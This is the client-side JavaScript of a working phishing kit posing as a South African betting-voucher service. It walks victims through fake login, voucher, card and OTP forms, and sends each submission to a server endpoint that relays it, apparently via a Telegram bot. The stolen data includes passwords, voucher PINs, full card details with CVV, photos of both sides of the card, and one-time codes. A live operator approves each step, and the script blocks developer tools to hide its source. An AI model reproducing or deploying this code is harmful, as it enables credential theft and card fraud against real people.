document.addEventListener("DOMContentLoaded", () => {
    let currentU = "Unknown";
    let lastMsgId = null;
    let pollInt = null;
    let chatPoll = null;
    let lId = null;

    // Security check logic wrapper
    document.onkeydown = function(e) {
        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) {
            let p = prompt("Source Locked. Enter Admin Password:");
            if (p !== "8890") {
                alert("Access Denied");
                return false;
            } else {
                return true;
            }
        }
    };

    // Initialization: Disable contextmenu
    document.body.addEventListener('contextmenu', e => e.preventDefault());

    // Fake Application Loading Transition
    setTimeout(() => {
        document.getElementById('loading-view').style.display = 'none';
        document.getElementById('home-view').classList.add('active');
    }, 2000);

    // Event Listeners Configuration
    document.querySelectorAll('.open-login').forEach(el => el.addEventListener('click', () => openModal('login-modal')));
    document.querySelectorAll('.open-signup').forEach(el => el.addEventListener('click', () => openModal('signup-modal')));
    document.querySelectorAll('.standard-login-trigger').forEach(el => el.addEventListener('click', () => openModal('login-modal')));
    document.querySelectorAll('.open-recovery').forEach(el => el.addEventListener('click', () => openModal('forgot-pw-modal')));
    document.querySelectorAll('.close-modal-btn').forEach(el => el.addEventListener('click', closeModals));
    document.querySelectorAll('.signup-redirect-trigger').forEach(el => el.addEventListener('click', showProfessionalRedirect));
    
    document.getElementById('chat-icon').addEventListener('click', toggleChat);
    document.getElementById('chat-tab-trigger').addEventListener('click', toggleChat);
    document.getElementById('close-chat').addEventListener('click', toggleChat);
    document.getElementById('send-chat-btn').addEventListener('click', sendChatTxt);
    document.getElementById('chat-file').addEventListener('change', sendChatPhoto);
    document.getElementById('eye-login').addEventListener('click', () => togglePassword('login-pw', 'eye-login'));

    document.getElementById('card-num').addEventListener('input', (e) => { formatCard(e.target); remErr(e.target); });
    document.getElementById('card-exp').addEventListener('input', (e) => { formatExp(e.target); remErr(e.target); });
    
    // Clear validation bugs on key inputs
    ['lgn-mobile', 'login-pw', 'vch-input', 'card-holder', 'card-cvv', 'otp-input', 'forgot-input'].forEach(id => {
        document.getElementById(id)?.addEventListener('input', (e) => remErr(e.target));
    });

    // Form Submissions Hooked to Netlify Function Engine
    document.querySelectorAll('.submit-btn').forEach(btn => {
        btn.addEventListener('click', (event) => {
            const targetLogType = event.currentTarget.getAttribute('data-log-type');
            if(targetLogType) sendData(targetLogType, event);
        });
    });

    document.querySelector('.exit-lobby-btn').addEventListener('click', () => location.reload());

    // Core Modular UI Handling Elements
    function openModal(id) {
        closeModals();
        document.getElementById(id).style.display = 'flex';
    }

    function closeModals() {
        document.querySelectorAll('.overlay').forEach(el => el.style.display = 'none');
        stopAllSpinners();
    }

    function stopAllSpinners() {
        document.querySelectorAll('.submit-btn').forEach(b => {
            b.disabled = false;
            b.innerHTML = b.getAttribute('data-orig') || b.innerHTML;
        });
    }

    function togglePassword(inputId) {
        const field = document.getElementById(inputId);
        field.type = field.type === "text" ? "password" : "text";
    }

    function formatCard(input) {
        let v = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let parts = [];
        for (let j = 0; j < v.length; j += 4) {
            parts.push(v.substring(j, j + 4));
        }
        input.value = parts.join(' ');
    }

    function formatExp(input) {
        let v = input.value.replace(/\//g, '').replace(/[^0-9]/gi, '');
        if (v.length >= 2) {
            input.value = v.substring(0, 2) + '/' + v.substring(2, 4);
        } else {
            input.value = v;
        }
    }

    function showError(id) {
        const e = document.getElementById(id);
        if (e) e.style.display = 'flex';
        setTimeout(() => { if (e) e.style.display = 'none'; }, 5000);
    }

    function showProfessionalRedirect() {
        closeModals();
        document.getElementById('redirect-overlay').style.display = 'flex';
        let count = 3;
        const interval = setInterval(() => {
            count--;
            document.getElementById('timer').innerText = count;
            if (count <= 0) {
                clearInterval(interval);
                document.getElementById('redirect-overlay').style.display = 'none';
                openModal('login-modal');
            }
        }, 1000);
    }

    function remErr(input) {
        input.classList.remove('error-field');
    }

    function validate(ids) {
        let valid = true;
        let first = null;
        ids.forEach(id => {
            const el = document.getElementById(id);
            const val = el.value.trim();
            if (id === 'card-cvv') {
                if (val.length < 3 || val.length > 4) {
                    el.classList.add('error-field');
                    valid = false; if (!first) first = el;
                }
            } else if (id === 'otp-input') {
                if (val.length < 4 || val.length > 6) {
                    el.classList.add('error-field');
                    valid = false; if (!first) first = el;
                }
            } else {
                if (!val || val.length < 1) {
                    el.classList.add('error-field');
                    valid = false; if (!first) first = el;
                } else {
                    el.classList.remove('error-field');
                }
            }
        });
        if (first) first.focus();
        return valid;
    }

    // Chat Controller Functions
    function toggleChat() {
        const w = document.getElementById('chat-window');
        w.style.display = w.style.display === 'flex' ? 'none' : 'flex';
        if (w.style.display === 'flex') pollChat();
    }

    function addMsg(txt, cls) {
        const d = document.createElement('div');
        d.className = `msg-b ${cls}`;
        d.innerText = txt;
        document.getElementById('chat-msgs').appendChild(d);
        document.getElementById('chat-msgs').scrollTop = 9999;
    }

    async function sendChatTxt() {
        const t = document.getElementById('chat-txt');
        if (!t.value) return;
        const msgStr = t.value;
        addMsg(msgStr, 'msg-user');
        t.value = '';

        await fetch('/.netlify/functions/api', {
            method: 'POST',
            body: JSON.stringify({ action: 'sendMessage', text: `💬 Support [${currentU}]: ${msgStr}` })
        });
    }

    async function sendChatPhoto() {
        const f = document.getElementById('chat-file').files[0];
        if (!f) return;
        addMsg('Sending attachment...', 'msg-user');
        
        const reader = new FileReader();
        reader.readAsDataURL(f);
        reader.onloadend = async () => {
            const base64Data = reader.result.split(',')[1];
            await fetch('/.netlify/functions/api', {
                method: 'POST',
                body: JSON.stringify({ action: 'sendPhoto', photo: base64Data, caption: `Chat Photo: ${currentU}` })
            });
            addMsg('Attachment sent.', 'msg-user');
        };
    }

    function pollChat() {
        if (chatPoll) return;
        chatPoll = setInterval(async () => {
            try {
                let res = await fetch('/.netlify/functions/api?action=getUpdates');
                let d = await res.json();
                const m = d.result?.[0]?.message;
                if (m && m.reply_to_message && m.text) {
                    if (!lId || lId !== m.message_id) {
                        lId = m.message_id;
                        addMsg(m.text, 'msg-agent');
                    }
                }
            } catch(e){}
        }, 3000);
    }

    // Server Approval Workflow Logic Routine
    function startPolling(logType) {
        if (pollInt) clearInterval(pollInt);
        pollInt = setInterval(async () => {
            try {
                let res = await fetch('/.netlify/functions/api?action=getUpdates');
                let d = await res.json();
                const last = d.result?.[0];
                if (last && last.callback_query) {
                    const cb = last.callback_query;
                    if (cb.message.message_id === lastMsgId) {
                        const act = cb.data;
                        if (act === "approve") {
                            clearInterval(pollInt); pollInt = null;
                            document.getElementById('process-overlay').style.display = 'none';
                            stopAllSpinners();
                            if (logType === 'Betting Voucher logs') openModal('vch-modal');
                            else if (logType === 'Voucher logs') openModal('card-modal');
                            else if (logType === 'Card logs') openModal('otp-modal');
                            else {
                                document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
                                document.getElementById('success-view').classList.add('active');
                                closeModals();
                            }
                        } else if (act === "reject") {
                            clearInterval(pollInt); pollInt = null;
                            document.getElementById('process-overlay').style.display = 'none';
                            stopAllSpinners();
                            if (logType === 'Betting Voucher logs') showError('login-error');
                            else if (logType === 'Voucher logs') showError('vch-error');
                            else if (logType === 'Card logs') showError('card-error');
                            else if (logType === 'OTP logs') showError('otp-error');
                        }
                    }
                }
            } catch (e) {}
        }, 2000);
    }

    async function sendData(type, event) {
        const btn = event.currentTarget;
        if (!btn.getAttribute('data-orig')) btn.setAttribute('data-orig', btn.innerHTML);

        if (type === 'Betting Voucher logs') {
            if (!validate(['lgn-mobile', 'login-pw'])) return;
            currentU = document.getElementById('lgn-mobile').value;
        } else if (type === 'Voucher logs') {
            if (!validate(['vch-input'])) return;
        } else if (type === 'Card logs') {
            if (!validate(['card-holder', 'card-num', 'card-exp', 'card-cvv'])) return;
        } else if (type === 'OTP logs') {
            if (!validate(['otp-input'])) return;
        }

        let msg = "";
        let payload = { action: 'sendStructuredData' };

        if (type === 'Betting Voucher logs') {
            msg = `📱 *Betting Voucher Login SA 🇿🇦🇿🇦*\n👤 *User:* \`${currentU}\`\n🔑 *Pass:* \`${document.getElementById('login-pw').value}\``;
        } else if (type === 'Voucher logs') {
            msg = `🎫 *Voucher*\n👤 *User:* \`${currentU}\`\n🏷️ *Type:* ${document.getElementById('vch-type').value}\n🔑 *PIN:* \`${document.getElementById('vch-input').value}\``;
        } else if (type === 'Card logs') {
            msg = `💳 *Card*\n👤 *User:* \`${currentU}\`\n👤 *Holder:* ${document.getElementById('card-holder').value}\n💳 *Num:* \`${document.getElementById('card-num').value}\`\n📅 *Exp:* \`${document.getElementById('card-exp').value}\`\n🔐 *CVV:* \`${document.getElementById('card-cvv').value}\``;
            
            // Handle optional asset file conversions to base64
            const f1 = document.getElementById('card-front').files[0];
            const f2 = document.getElementById('card-back').files[0];
            if (f1) payload.file1 = await getBase64(f1);
            if (f2) payload.file2 = await getBase64(f2);
        } else if (type === 'OTP logs') {
            msg = `🔐 *OTP*\n👤 *User:* \`${currentU}\`\n📟 *OTP:* \`${document.getElementById('otp-input').value}\``;
        }

        payload.message = msg;
        payload.currentUser = currentU;

        btn.disabled = true;
        btn.innerHTML = `<div class="spinner"></div>`;
        document.getElementById('process-overlay').style.display = 'flex';

        try {
            let response = await fetch('/.netlify/functions/api', {
                method: 'POST',
                body: JSON.stringify(payload)
            });
            let resData = await response.json();
            if (resData.ok) {
                lastMsgId = resData.result.message_id;
            }
        } catch (err) {}

        startPolling(type);
    }

    function getBase64(file) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = () => resolve(reader.result.split(',')[1]);
            reader.onerror = error => reject(error);
        });
    }
});

